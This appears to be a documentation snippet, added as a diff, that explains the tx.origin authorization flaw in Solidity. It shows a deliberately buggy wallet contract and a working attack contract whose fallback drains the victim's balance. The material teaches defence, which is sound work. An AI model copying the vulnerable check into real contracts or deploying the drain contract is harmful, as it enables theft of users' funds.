@@ -1,0 +1,53 @@
+<p>
+	Let’s say you have a wallet contract like this:
+</p>
+<p>
+<pre>
+<code>
+pragma solidity ^0.4.11;
+
+// THIS CONTRACT CONTAINS A BUG - DO NOT USE
+contract TxUserWallet {
+    address owner;
+
+    function TxUserWallet() {
+        owner = msg.sender;
+    }
+
+    function transferTo(address dest, uint amount) {
+        require(tx.origin == owner);
+        dest.transfer(amount);
+    }
+}
+</code>
+</pre>
+</p>
+<p>
+	Now someone tricks you into sending ether to the address of this attack wallet:
+</p>
+<p>
+<pre>
+<code>
+pragma solidity ^0.4.11;
+
+interface TxUserWallet {
+    function transferTo(address dest, uint amount);
+}
+
+contract TxAttackWallet {
+    address owner;
+
+    function TxAttackWallet() {
+        owner = msg.sender;
+    }
+
+    function() {
+        TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);
+    }
+}
+</code>
+</pre>
+</p>
+<p>
+	If your wallet had checked <code>msg.sender</code> for authorization, it would get the address of the attack wallet, instead of the owner address. But by checking <code>tx.origin</code>, it gets the original address that kicked off the transaction, which is still the owner address. The attack wallet instantly drains all your funds.
+</p>
